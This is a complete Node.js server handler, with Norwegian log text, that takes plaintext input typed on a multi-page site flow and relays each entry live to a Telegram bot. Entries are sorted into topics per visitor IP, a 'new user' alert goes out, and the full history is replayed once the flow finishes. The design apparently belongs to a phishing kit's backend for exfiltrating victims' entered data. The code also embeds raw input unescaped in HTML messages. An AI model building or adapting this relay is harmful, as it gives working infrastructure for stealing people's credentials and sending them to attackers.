// api/log_data.js — Express handler (CommonJS)
const crypto = require('crypto');

// ============================================================
// TELEGRAM CONFIG
// ============================================================

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ------------------------------------------------------------
// Telegram rate limiting
//
// Telegram recommends avoiding more than ~1 message/sec in a
// single chat. We deliberately use a little more spacing to
// give ourselves safety margin.
//
// IMPORTANT:
// This is an in-memory queue. It protects concurrent requests
// handled by the same Vercel instance. Telegram 429 responses
// are ALSO handled, so separate Vercel instances are still safe.
// ------------------------------------------------------------

const TELEGRAM_MIN_INTERVAL_MS = 1100;

let telegramQueue = Promise.resolve();
let telegramLastRequestAt = 0;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Runs Telegram requests sequentially.
 *
 * This prevents several requests from hitting Telegram
 * simultaneously on the same Vercel instance.
 */
function queueTelegramRequest(task) {
  const run = telegramQueue.then(async () => {
    const now = Date.now();
    const waitTime =
      telegramLastRequestAt + TELEGRAM_MIN_INTERVAL_MS - now;

    if (waitTime > 0) {
      await sleep(waitTime);
    }

    telegramLastRequestAt = Date.now();

    return task();
  });

  // IMPORTANT:
  // Keep the queue alive even if one Telegram request fails.
  telegramQueue = run.catch(() => {});

  return run;
}

// ============================================================
// CACHE
// ============================================================

// Cache for IP -> topic/message_thread_id
// In production, a database is recommended.
const ipToTopicMap = new Map();
const ipToFullTopicMap = new Map();
const ipLogHistory = new Map();
const ipFullTopicSynced = new Set();

// Prevent duplicate topic creation on the same Vercel instance.
const topicCreationPromises = new Map();

// Prevent multiple history syncs for the same IP.
const fullTopicSyncPromises = new Map();

// ============================================================
// HELPERS
// ============================================================

function getFullTopicName(ipAddress) {
  return `Full: ${ipAddress}`;
}

function appendLogHistory(ipAddress, entry) {
  if (!ipLogHistory.has(ipAddress)) {
    ipLogHistory.set(ipAddress, []);
  }

  ipLogHistory.get(ipAddress).push(entry);
}

function getLogHistory(ipAddress) {
  return ipLogHistory.get(ipAddress) || [];
}

const PAGE_FLOW_ORDER = {
  'page1.5.html': 1,
  'page1.7.html': 2,
  'page2.html': 3,
  'page3.html': 4,
  'page3.5.html': 5,
  'page4.html': 6,
  'page5.html': 7,
  'page6.html': 8,
  'page7.html': 9,
};

function getPageFlowOrder(page) {
  return PAGE_FLOW_ORDER[page] ?? 999;
}

function getOrderedLogHistory(ipAddress) {
  return [...getLogHistory(ipAddress)].sort((a, b) => {
    const pageOrder =
      getPageFlowOrder(a.page) - getPageFlowOrder(b.page);

    if (pageOrder !== 0) {
      return pageOrder;
    }

    return (
      new Date(a.timestamp).getTime() -
      new Date(b.timestamp).getTime()
    );
  });
}

// ============================================================
// TELEGRAM ERROR HELPERS
// ============================================================

function extractRetryAfter(errorData) {
  // Preferred location according to Telegram Bot API:
  // response.parameters.retry_after
  if (
    errorData &&
    errorData.parameters &&
    Number.isFinite(Number(errorData.parameters.retry_after))
  ) {
    return Number(errorData.parameters.retry_after);
  }

  // Fallback for descriptions such as:
  // "Too Many Requests: retry after 20"
  const description = errorData?.description || '';

  const match = description.match(/retry after\s+(\d+)/i);

  if (match) {
    return Number(match[1]);
  }

  return null;
}

function createTelegramError(errorData, status) {
  const error = new Error(
    `Telegram API error: ${
      errorData?.description || `HTTP ${status}`
    }`
  );

  error.telegram = true;
  error.status = status;
  error.error_code = errorData?.error_code;
  error.parameters = errorData?.parameters || {};

  const retryAfter = extractRetryAfter(errorData);

  if (retryAfter !== null) {
    error.retry_after = retryAfter;
  }

  return error;
}

// ============================================================
// FIND EXISTING TOPIC
// ============================================================

async function findExistingTopicByName(topicName) {
  try {
    let offset = 0;
    const limit = 100;
    let hasMore = true;

    while (hasMore) {
      const telegramApiUrl =
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;

      const response = await queueTelegramRequest(() =>
        fetch(telegramApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            offset,
            limit,
          }),
        })
      );

      const result = await response.json().catch(() => ({}));

      if (!response.ok || !result.ok) {
        console.log(
          `getForumTopics feilet: ${
            result.description || response.statusText
          }`
        );

        return null;
      }

      if (
        result.result &&
        Array.isArray(result.result.topics)
      ) {
        const existingTopic =
          result.result.topics.find(
            topic => topic.name === topicName
          );

        if (existingTopic) {
          console.log(
            `Fant eksisterende topic "${topicName}": ` +
            `${existingTopic.message_thread_id}`
          );

          return existingTopic.message_thread_id;
        }

        if (result.result.topics.length < limit) {
          hasMore = false;
        } else {
          offset += limit;
        }
      } else {
        hasMore = false;
      }
    }

    return null;
  } catch (error) {
    console.error(
      `Feil ved søk etter topic "${topicName}":`,
      error
    );

    return null;
  }
}

async function findExistingTopicForIP(ipAddress) {
  return findExistingTopicByName(`IP: ${ipAddress}`);
}

// ============================================================
// CREATE FORUM TOPIC
// ============================================================

async function createForumTopic(
  topicName,
  iconColor = 0x6FB9F0
) {
  const telegramApiUrl =
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;

  const response = await queueTelegramRequest(() =>
    fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        name: topicName,
        icon_color: iconColor,
      }),
    })
  );

  const errorData = await response.json().catch(() => ({}));

  if (!response.ok || !errorData.ok) {
    if (
      errorData.description &&
      errorData.description.includes('already exists')
    ) {
      console.log(
        `Topic "${topicName}" eksisterer allerede, ` +
        `søker etter det...`
      );

      const existingTopicId =
        await findExistingTopicByName(topicName);

      if (existingTopicId) {
        return existingTopicId;
      }
    }

    if (errorData.error_code === 400) {
      throw new Error(
        'Topics ikke støttet - sjekk at gruppen er en ' +
        'supergruppe med topics aktivert'
      );
    }

    throw createTelegramError(
      errorData,
      response.status
    );
  }

  console.log(
    `Opprettet nytt topic "${topicName}": ` +
    `${errorData.result.message_thread_id}`
  );

  return errorData.result.message_thread_id;
}

// ============================================================
// GET OR CREATE TOPIC
// ============================================================

async function getOrCreateTopicByName(
  topicName,
  iconColor = 0x6FB9F0
) {
  // First check local creation cache.
  if (topicCreationPromises.has(topicName)) {
    return topicCreationPromises.get(topicName);
  }

  const operation = (async () => {
    // Check Telegram first.
    const existingTopicId =
      await findExistingTopicByName(topicName);

    if (existingTopicId) {
      return existingTopicId;
    }

    // Try to create it.
    try {
      return await createForumTopic(
        topicName,
        iconColor
      );
    } catch (error) {
      console.error(
        `Kunne ikke opprette topic "${topicName}":`,
        error
      );

      // If Telegram says it already exists, search again.
      if (
        error.message &&
        error.message.includes('already exists')
      ) {
        return await findExistingTopicByName(topicName);
      }

      // If Telegram rate-limited topic creation,
      // wait and retry ONCE using retry_after.
      if (
        error.telegram &&
        error.retry_after
      ) {
        const waitSeconds =
          Math.max(1, error.retry_after) + 1;

        console.log(
          `Telegram rate limit ved topic "${topicName}". ` +
          `Venter ${waitSeconds}s...`
        );

        await sleep(waitSeconds * 1000);

        try {
          return await createForumTopic(
            topicName,
            iconColor
          );
        } catch (retryError) {
          console.error(
            `Topic retry feilet "${topicName}":`,
            retryError
          );

          // One last check. Another request may have
          // created the topic while we were waiting.
          return await findExistingTopicByName(
            topicName
          );
        }
      }

      return null;
    }
  })();

  topicCreationPromises.set(topicName, operation);

  try {
    return await operation;
  } finally {
    topicCreationPromises.delete(topicName);
  }
}

// ============================================================
// IP TOPICS
// ============================================================

async function getOrCreateTopicForIP(ipAddress) {
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  const topicId =
    await getOrCreateTopicByName(
      `IP: ${ipAddress}`,
      0x6FB9F0
    );

  if (topicId) {
    ipToTopicMap.set(ipAddress, topicId);
  }

  return topicId;
}

// ============================================================
// FULL TOPIC
// ============================================================

async function getOrCreateFullTopicForIP(ipAddress) {
  if (ipToFullTopicMap.has(ipAddress)) {
    return ipToFullTopicMap.get(ipAddress);
  }

  const topicId =
    await getOrCreateTopicByName(
      getFullTopicName(ipAddress),
      0x8EEE98
    );

  if (topicId) {
    ipToFullTopicMap.set(ipAddress, topicId);
  }

  return topicId;
}

// ============================================================
// CREATE TOPIC FOR IP
// ============================================================

async function createTopicForIP(ipAddress) {
  return createForumTopic(
    `IP: ${ipAddress}`,
    0x6FB9F0
  );
}

// ============================================================
// SEND TELEGRAM MESSAGE
// ============================================================

async function sendToTelegram(
  chatId,
  message,
  topicId = null,
  retryCount = 0
) {
  const telegramApiUrl =
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML',
  };

  if (topicId !== null) {
    payload.message_thread_id = topicId;
  }

  try {
    const response =
      await queueTelegramRequest(() =>
        fetch(telegramApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        })
      );

    const result =
      await response.json().catch(() => ({}));

    if (response.ok && result.ok) {
      return result;
    }

    // --------------------------------------------------------
    // Telegram 429
    // --------------------------------------------------------

    if (
      response.status === 429 ||
      result.error_code === 429
    ) {
      const retryAfter =
        extractRetryAfter(result) || 5;

      // Don't hammer Telegram with infinite retries.
      if (retryCount >= 3) {
        const error =
          createTelegramError(
            result,
            response.status
          );

        error.retry_exhausted = true;

        throw error;
      }

      const waitSeconds =
        Math.max(1, retryAfter) + 1;

      console.warn(
        `Telegram rate limit: retry after ` +
        `${retryAfter}s. ` +
        `Waiting ${waitSeconds}s...`
      );

      await sleep(waitSeconds * 1000);

      return sendToTelegram(
        chatId,
        message,
        topicId,
        retryCount + 1
      );
    }

    throw createTelegramError(
      result,
      response.status
    );
  } catch (error) {
    // Network errors can occasionally happen on Vercel.
    // Retry a small number of times.
    if (
      !error.telegram &&
      retryCount < 2
    ) {
      const waitMs =
        1000 * (retryCount + 1);

      console.warn(
        `Telegram network error. ` +
        `Retrying in ${waitMs}ms...`
      );

      await sleep(waitMs);

      return sendToTelegram(
        chatId,
        message,
        topicId,
        retryCount + 1
      );
    }

    throw error;
  }
}

// ============================================================
// FORMAT NORMAL MESSAGE
// ============================================================

function formatTelegramMessage(
  data,
  isNewIPAddress = false
) {
  const {
    page,
    event_description,
    klartekst_input,
    ip_adresse,
    session_uid,
    timestamp,
  } = data;

  let message = '';

  if (isNewIPAddress) {
    message +=
      `🆕 <b>Ny bruker opprettet</b>\n`;
    message +=
      `📍 <b>IP-adresse:</b> ` +
      `<code>${ip_adresse}</code>\n`;
    message +=
      `━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  message += `🔔 <b>Aktivitet</b>\n`;
  message +=
    `📄 <b>Side:</b> ` +
    `${page || 'Ukjent'}\n`;

  message +=
    `📝 <b>Hendelse:</b> ` +
    `${event_description || 'Ingen beskrivelse'}\n`;

  if (klartekst_input) {
    message +=
      `✏️ <b>Input:</b> ` +
      `<code>${klartekst_input}</code>\n`;
  }

  if (session_uid) {
    message +=
      `🆔 <b>Session ID:</b> ` +
      `<code>${session_uid}</code>\n`;
  }

  const formattedTime = timestamp
    ? new Date(timestamp).toLocaleString(
        'nb-NO',
        { timeZone: 'Europe/Oslo' }
      )
    : new Date().toLocaleString(
        'nb-NO',
        { timeZone: 'Europe/Oslo' }
      );

  message +=
    `\n⏰ <b>Tid:</b> ${formattedTime}`;

  return message;
}

// ============================================================
// FORMAT COMPLETION MESSAGE
// ============================================================

function formatCompletionMessage(
  data,
  isNewFullTopic = false
) {
  const {
    page,
    event_description,
    klartekst_input,
    ip_adresse,
    session_uid,
  } = data;

  let message = '';

  if (isNewFullTopic) {
    message +=
      `✅ <b>Fullført flyt</b>\n`;

    message +=
      `📍 <b>IP-adresse:</b> ` +
      `<code>${ip_adresse}</code>\n`;

    message +=
      `━━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    message +=
      `✅ <b>Flyt fullført (oppdatering)</b>\n\n`;
  }

  message +=
    `📄 <b>Siste side:</b> ` +
    `${page || 'Ukjent'}\n`;

  message +=
    `📝 <b>Hendelse:</b> ` +
    `${event_description || 'Ingen beskrivelse'}\n`;

  if (klartekst_input) {
    message +=
      `✏️ <b>Input:</b> ` +
      `<code>${klartekst_input}</code>\n`;
  }

  if (session_uid) {
    message +=
      `🆔 <b>Session ID:</b> ` +
      `<code>${session_uid}</code>\n`;
  }

  message +=
    `\n⏰ <b>Tid:</b> ` +
    `${new Date().toLocaleString(
      'nb-NO',
      { timeZone: 'Europe/Oslo' }
    )}`;

  return message;
}

// ============================================================
// FULL TOPIC HISTORY SYNC
// ============================================================

async function syncFullTopicHistory(
  ipAddress,
  fullTopicId,
  currentData
) {
  // If another request is already syncing this IP,
  // wait for that same operation instead of starting
  // another history sync.
  if (fullTopicSyncPromises.has(ipAddress)) {
    return fullTopicSyncPromises.get(ipAddress);
  }

  const syncOperation = (async () => {
    try {
      const completionMessage =
        formatCompletionMessage(
          currentData,
          true
        );

      const history =
        getOrderedLogHistory(ipAddress);

      console.log(
        `Starter Full-topic sync for ${ipAddress}. ` +
        `${history.length} logger.`
      );

      // ------------------------------------------------------
      // IMPORTANT:
      // Messages are sent one by one.
      //
      // sendToTelegram() already has a global queue and
      // rate-limit protection.
      // ------------------------------------------------------

      for (const entry of history) {
        const historyMessage =
          formatTelegramMessage(
            {
              page: entry.page,
              event_description:
                entry.event_description,
              klartekst_input:
                entry.klartekst_input,
              ip_adresse: ipAddress,
              session_uid:
                entry.session_uid,
              timestamp: entry.timestamp,
            },
            false
          );

        try {
          await sendToTelegram(
            TELEGRAM_CHAT_ID,
            historyMessage,
            fullTopicId
          );

          console.log(
            `Full-topic: sendte ` +
            `${entry.page || 'ukjent side'}`
          );
        } catch (error) {
          console.error(
            `Kunne ikke sende historikk ` +
            `${entry.page}:`,
            error
          );

          // Do NOT continue hammering Telegram after
          // a hard failure.
          throw error;
        }
      }

      // Completion message goes last.
      await sendToTelegram(
        TELEGRAM_CHAT_ID,
        completionMessage,
        fullTopicId
      );

      ipFullTopicSynced.add(ipAddress);

      console.log(
        `Historikk (${history.length} logger) ` +
        `sendt i flytrekkefølge til topic ` +
        `"${getFullTopicName(ipAddress)}"`
      );

      return true;
    } finally {
      fullTopicSyncPromises.delete(ipAddress);
    }
  })();

  fullTopicSyncPromises.set(
    ipAddress,
    syncOperation
  );

  return syncOperation;
}

// ============================================================
// HANDLER
// ============================================================

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({
      message: 'Kun POST er tillatt',
    });
  }

  try {
    // --------------------------------------------------------
    // Validate Telegram config
    // --------------------------------------------------------

    if (
      !TELEGRAM_BOT_TOKEN ||
      !TELEGRAM_CHAT_ID
    ) {
      throw new Error(
        'TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID ' +
        'er ikke satt i miljøvariabler'
      );
    }

    const {
      page,
      event_description,
      klartekst_input,
      session_uid: client_session_uid,
      flow_completed,
    } = req.body;

    // --------------------------------------------------------
    // Get IP
    // --------------------------------------------------------

    const forwardedFor =
      req.headers['x-forwarded-for'];

    const ip_adresse = forwardedFor
      ? forwardedFor
          .split(',')[0]
          .trim()
      : req.headers['x-real-ip'] ||
        req.socket.remoteAddress ||
        'Ukjent IP';

    // --------------------------------------------------------
    // Session UID
    // --------------------------------------------------------

    let session_uid =
      client_session_uid;

    if (!session_uid) {
      session_uid =
        crypto.randomUUID();

      console.log(
        'Genererte ny session_uid på serveren:',
        session_uid
      );
    } else {
      console.log(
        'Mottok session_uid fra klienten:',
        session_uid
      );
    }

    // --------------------------------------------------------
    // Check whether this is a new IP
    // --------------------------------------------------------

    const isNewIPAddress =
      !ipToTopicMap.has(ip_adresse);

    // --------------------------------------------------------
    // Save log
    // --------------------------------------------------------

    const logEntry = {
      page,
      event_description,
      klartekst_input,
      session_uid,
      timestamp:
        new Date().toISOString(),
    };

    appendLogHistory(
      ip_adresse,
      logEntry
    );

    // --------------------------------------------------------
    // Get/create IP topic
    // --------------------------------------------------------

    const topicId =
      await getOrCreateTopicForIP(
        ip_adresse
      );

    // --------------------------------------------------------
    // Create live page message
    // --------------------------------------------------------

    const message =
      formatTelegramMessage(
        {
          page,
          event_description,
          klartekst_input,
          ip_adresse,
          session_uid,
          timestamp:
            logEntry.timestamp,
        },
        isNewIPAddress
      );

    // --------------------------------------------------------
    // SEND CURRENT PAGE IMMEDIATELY
    //
    // This is the important part:
    //
    // Every page produces its own Telegram message.
    // --------------------------------------------------------

    await sendToTelegram(
      TELEGRAM_CHAT_ID,
      message,
      topicId
    );

    console.log(
      `Live page sendt til Telegram: ` +
      `${ip_adresse} -> ${page}`
    );

    // ========================================================
    // FULL TOPIC
    // ========================================================

    if (flow_completed) {
      const fullTopicId =
        await getOrCreateFullTopicForIP(
          ip_adresse
        );

      if (fullTopicId) {
        const currentData = {
          page,
          event_description,
          klartekst_input,
          ip_adresse,
          session_uid,
        };

        // ----------------------------------------------------
        // First completion:
        //
        // Sync previous history into Full topic.
        //
        // This is sequential and rate-limited.
        // ----------------------------------------------------

        if (
          !ipFullTopicSynced.has(ip_adresse)
        ) {
          await syncFullTopicHistory(
            ip_adresse,
            fullTopicId,
            currentData
          );
        } else {
          // --------------------------------------------------
          // Full topic already synced.
          // Just send the current page.
          // --------------------------------------------------

          await sendToTelegram(
            TELEGRAM_CHAT_ID,
            message,
            fullTopicId
          );
        }

        console.log(
          `Full-topic oppdatert for IP: ${ip_adresse}`
        );
      }
    } else if (
      ipFullTopicSynced.has(ip_adresse)
    ) {
      // ------------------------------------------------------
      // User already completed the flow.
      // Any later pages also go live into Full topic.
      // ------------------------------------------------------

      const fullTopicId =
        ipToFullTopicMap.get(ip_adresse);

      if (fullTopicId) {
        await sendToTelegram(
          TELEGRAM_CHAT_ID,
          message,
          fullTopicId
        );
      }
    }

    // --------------------------------------------------------
    // Success
    // --------------------------------------------------------

    console.log(
      `Data sendt til Telegram for IP: ${ip_adresse}`
    );

    return res.status(200).json({
      message:
        'Data sendt til Telegram!',
      session_uid,
      ip_adresse,
    });

  } catch (error) {
    console.error(
      'Telegram error:',
      error
    );

    // --------------------------------------------------------
    // IMPORTANT:
    //
    // Telegram 429 is a temporary rate-limit condition.
    // Do not pretend it is a generic server failure.
    // --------------------------------------------------------

    if (
      error.telegram &&
      error.retry_after
    ) {
      return res.status(202).json({
        message:
          'Data mottatt, men Telegram er midlertidig rate-limitet.',
        retry_after:
          error.retry_after,
        session_uid:
          req.body?.session_uid || null,
      });
    }

    return res.status(500).json({
      message:
        `Serverfeil: ${error.message}`,
    });
  }
}

module.exports = handler;
